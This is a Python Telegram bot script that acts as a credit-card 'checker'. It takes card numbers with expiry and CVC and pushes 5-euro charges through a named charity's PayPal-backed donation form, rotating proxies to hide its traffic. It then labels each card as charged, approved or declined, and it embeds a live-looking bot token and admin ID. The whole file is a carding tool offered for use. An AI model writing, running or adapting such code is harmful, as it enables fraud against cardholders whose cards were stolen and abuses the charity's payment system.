import telebot, base64, re, time, os, json, threading, hashlib, requests, random, queue, urllib3
import logging
urllib3.disable_warnings()

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# ====================== LOGGING ======================
logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
logger = logging.getLogger(__name__)

# ========================= CONFIG =========================
BOT_TOKEN = '8663863938:AAG1yVZYZLrbRcSIWLBiN7MJFqnmV3i2CqE'
ADMIN_ID = 7077294261

FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3

USE_PROXY = True
PROXY_FILE = "proxy.txt"

# ====================== PROXY ======================
PROXY_QUEUE = queue.Queue()

def load_proxies():
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                if line.strip(): PROXY_QUEUE.put(line.strip())
        logger.info("Proxies Loaded")

load_proxies()

def get_random_proxy():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    if '@' not in p and p.count(':') == 3:
        u, pw, h, port = p.split(':')
        p = f"{u}:{pw}@{h}:{port}"
    return {"http": f"http://{p}", "https": f"http://{p}"}, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

bot = telebot.TeleBot(BOT_TOKEN)
logger.info("Bot Started")

# ====================== CHECKER (5€) ======================
def check_cc(ccx, proxy=None):
    proxy_status = "🟢 PROXY" if proxy else "🔴 NO PROXY"
    logger.info(f"Checking {ccx[:6]}xxxx | {proxy_status} | Amount: 5€")

    try:
        parts = ccx.split("|")
        if len(parts) < 4:
            return "ERROR", "Invalid Format"

        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()

        us = generate_user_agent()
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies.update(proxy)

        # Load Page
        r = session.get('https://www.rarediseasesinternational.org/donate/', 
                       headers={'User-Agent': us}, timeout=25)

        if 'cf-ray' in r.headers or r.status_code == 403:
            return "ERROR", "Cloudflare Block"

        m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
        m2 = re.search(r'name="give-form-id" value="(.*?)"', r.text)
        m3 = re.search(r'name="give-form-hash" value="(.*?)"', r.text)
        m4 = re.search(r'"data-client-token":"(.*?)"', r.text)

        if not all([m1, m2, m3, m4]):
            return "ERROR", "Token Error"

        id_form1 = m1.group(1)
        id_form2 = m2.group(1)
        nonec = m3.group(1)
        enc = m4.group(1)

        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)

        # === 5€ FORM DATA ===
        data = MultipartEncoder({
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-hash': nonec,
            'give-amount': '5',                    # ← 5€
            'give_first': 'John',
            'give_last': 'Doe',
            'give_email': 'test12345@gmail.com',
            'give-gateway': 'paypal-commerce',
            'payment-mode': 'paypal-commerce'
        })

        # Create Order
        session.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
                    headers={'Content-Type': data.content_type}, data=data, timeout=20)

        # Card Confirm (Original Logic)
        json_card = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc
                }
            }
        }

        # Approve Order
        final = session.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order',
                            headers={'Content-Type': data.content_type}, data=data, timeout=20)

        text = final.text.upper()

        if any(k in text for k in ['APPROVED', 'SUCCESS', 'THANK YOU']):
            return "CHARGED", "5€ Charged"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "APPROVED", "INSUFFICIENT_FUNDS"
        else:
            return "DECLINED", "Declined"

    except Exception as e:
        logger.error(str(e))
        return "ERROR", "Timeout"

# ====================== START ======================
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "✅ Bot Running with 5€ Check!")

@bot.message_handler(commands=['pp'])
def pp(message):
    try:
        cc = message.text.split()[1]
    except:
        return bot.reply_to(message, "Usage: /pp 411111|04|28|123")

    msg = bot.reply_to(message, "🔄 Checking 5€...")

    status, response = check_cc(cc)

    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

    res = f"""
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
Amount: 5€
"""
    bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")

if __name__ == "__main__":
    logger.info("=== BOT RUNNING WITH 5€ ===")
    bot.infinity_polling()
